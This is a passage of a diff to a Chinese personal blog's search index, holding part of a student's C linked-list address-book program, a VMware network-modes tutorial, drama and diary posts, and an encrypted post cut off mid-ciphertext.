class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> select;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的姓名：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的性别：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.sex));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的电话：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.tele));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的住址：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.add));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的分组：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.group));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;更新成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在该 ID！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//八、查找记录（根据ID）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要查找的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//九、打印输出所有记录  遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Printall_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中的全部记录如下：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//十、释放 链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Destroy_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p;			<span class="comment">//使用 q 暂时存放当前结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;释放成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单界面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t\t*********************简易通讯录*******************\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t1.初始化通讯录                          5.查找联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t2.创建通讯录                      	6.插入联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t3.删除联系人                      	7.遍历通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t4.修改联系人                      	8.释放通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t********************* 0 为退出 *******************\n&quot;</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//system(&quot;cls&quot;);</span></span><br><span class="line">        Menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择菜单：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">switch</span>(select)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//初始化</span></span><br><span class="line">                    Init_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//创建通讯录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Creat_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Creat_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//删除记录</span></span><br><span class="line">                    Dele_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//修改记录</span></span><br><span class="line">                    Update_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//查找记录</span></span><br><span class="line">                    Find_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//插入记录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择插入方式(1.前插法 2.尾插法)&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Insert_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Insert_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//遍历</span></span><br><span class="line">                    Printall_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//释放</span></span><br><span class="line">                    Destroy_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1374,6 +1364,16 @@
 ]]></content>
       <categories>
         <category>数据结构</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>恶之花有感</title>
+    <url>/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p>
+<p>即使不愿成为太阳，却依然绚烂夺目。</p>
+]]></content>
+      <categories>
+        <category>影视有感</category>
       </categories>
   </entry>
   <entry>
@@ -1491,6 +1491,60 @@
       </categories>
   </entry>
   <entry>
+    <title>虚拟机的网络设置</title>
+    <url>/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p>
+<p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p>
+<p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p>
+<blockquote>
+<ul>
+<li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li>
+<li><strong>VMnet8</strong> ：用于 NET 模式</li>
+<li><strong>VMnet1</strong> ：用于 Host-Only 模式</li>
+</ul>
+</blockquote>
+<p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p>
+<ul>
+<li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p>
+</li>
+<li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p>
+</li>
+<li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p>
+<p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p>
+<p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p>
+<blockquote>
+<p>使用 真实机 ping 192.168.4.234</p>
+<p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p>
+</blockquote>
+<p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p>
+<p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p>
+<p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p>
+<ul>
+<li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li>
+<li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li>
+<li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li>
+</ul>
+<blockquote>
+<p><strong>补充：</strong></p>
+<p><strong>169.254.X.X</strong></p>
+<p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>
+]]></content>
+      <categories>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>虚拟机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>计算机网络概念、发展、性能</title>
     <url>/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png" alt="image-20210929191834740"></p>
@@ -1603,60 +1657,6 @@
       </tags>
   </entry>
   <entry>
-    <title>虚拟机的网络设置</title>
-    <url>/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p>
-<p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p>
-<p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p>
-<blockquote>
-<ul>
-<li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li>
-<li><strong>VMnet8</strong> ：用于 NET 模式</li>
-<li><strong>VMnet1</strong> ：用于 Host-Only 模式</li>
-</ul>
-</blockquote>
-<p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p>
-<ul>
-<li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p>
-</li>
-<li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p>
-</li>
-<li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p>
-</li>
-</ul>
-<blockquote>
-<p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p>
-<p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p>
-<p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p>
-<blockquote>
-<p>使用 真实机 ping 192.168.4.234</p>
-<p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p>
-</blockquote>
-<p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p>
-<p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p>
-<p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p>
-<ul>
-<li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li>
-<li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li>
-<li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li>
-</ul>
-<blockquote>
-<p><strong>补充：</strong></p>
-<p><strong>169.254.X.X</strong></p>
-<p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>
-]]></content>
-      <categories>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>虚拟机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>那一年</title>
     <url>/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​        那一年放肆的自由</p>
@@ -1697,44 +1697,6 @@
 ]]></content>
       <categories>
         <category>音乐分享</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>难熬的一夜</title>
-    <url>/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p>
-<p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p>
-<p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p>
-<p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p>
-<p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p>
-<p>这一切。哎，总之，我很伤心，更为之心痛。</p>
-<p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p>
-<p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p>
-<p>明。</p>
-<p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p>
-<p>2021.8.27    6：12</p>
-]]></content>
-      <categories>
-        <category>生活杂谈</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>雨天心事</title>
-    <url>/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="94ca14958087636ac0d05246e2f08cdc77fbac705e80a44b4b290d7e348a4393">e91be0fd6c8a9227b7bcbe4e5e48d315c06aa4dc378147e1803de676640ec653b48c636617909faef5c22569585e67f2624f943dbd04bc3a4bc1e889c96c1c44fe86cf8189cc7f38066de20ed3e09ee470446ca383e292a288f38c1ff5a6edeaf4522c2592050d45424806119cfb091fff3cbf4949ac22db198b289b6718d25fd5258f1ac1fe9c84ef42543328f72721346d1f720eaba9fc244eba04c8158a640746cb6d2adf765058859136d535a857c9fd4a6bf6c4586394fda58cb6da01920d51f442b2b14d924759f4e4cd4079a0e838844ff4e3d58efd94fa90ce4278c3c924518f7802a60c16990c8977390c1238303a31f9328b73dc4ccae66a1c01a8bad2339e90bc4e00a3078f567cceac7ccea98820aece5f9ec96983a258624a5f5be0ac312748d1794e5d0849439130e5dd3c59665522e84a71bfd23c75bf056e21e2569a055563db1688fcca74f84234a845c119485dfd1d8d1edc96a39ed01c7a62cf262c6478bcb26f7e1cb279673b2bc978c68f035cdb801c095dc71bb0a1b7b800d648f8744394e428bff9c5042c611a83a5e2c0032258d4a8364ca987a0ed987df761031bb902a20d1b177273b561745ad3a171c4c2b5b6d9d47f2e258e653adc2ea9c73aeb1d907931a2e908289f80eb9202dac06035ba030297970f3235467707bf4485da5dd63ead56b4ed76b62d8c566ce726df1e1d1b32f12ec2313193c89bf97252f85e62fcd5cd447772503afcdf0ec62b9edf620d6c1de3bbd9ed66924c2856866cd7bb8ca4b1ca2da9db20f55c652b0aa28f4abd3c10316c9fbd60d0492370b873dda7f4213b05b015802af576956b13c13dc0f3c2bc420ef4656ad6e5003f24c6c562a54d3edd9e21cb49b6bce46f8c39200f2e268fae8aabaec974beeb47eb2b60b57966f327ba54bc492617000f7b2601fa422534022c39437d7495f39ce645ff2e7408359b9cca0777508adf4984c92f0ac6c68722abf6df8ae58d3358efc20c71d42a1a49d1458f6e2791ffae2dd1fdad1099fa60c2659e235224b9a5328a88e1d028171398d07a81e3dd51a63bc9bc25d488a6cedf0c10465354928eb1444d3eb0e5738a4602e5c624649f04e94bae613052604916bd2a3cb04ec418314ee55962cf5e27fbe27d526cb96324e2e40a18967c596e83cda0bdc562ed9259aaec04379fd1218cc92ca702205b7516de1b094f71e3b9f6254b664a83a8936829d1034a3896f69683138c3a09816cb41b259686f18042f7f2deb0ee9db058697a2765b3f0175c01499c715972db584137319bbeda1579d123f6ae7944cae638a103677458833b7c559fc608bc6d282e66f16c54f98fe79f6c9de7b0ab33aaa0d680b1904e6b1fc801e12b471aab330a1686c4c0c312bd6c68699c9ee6172ffc34a2646aea9b508791b1ba10c2113f30d074908e87382f5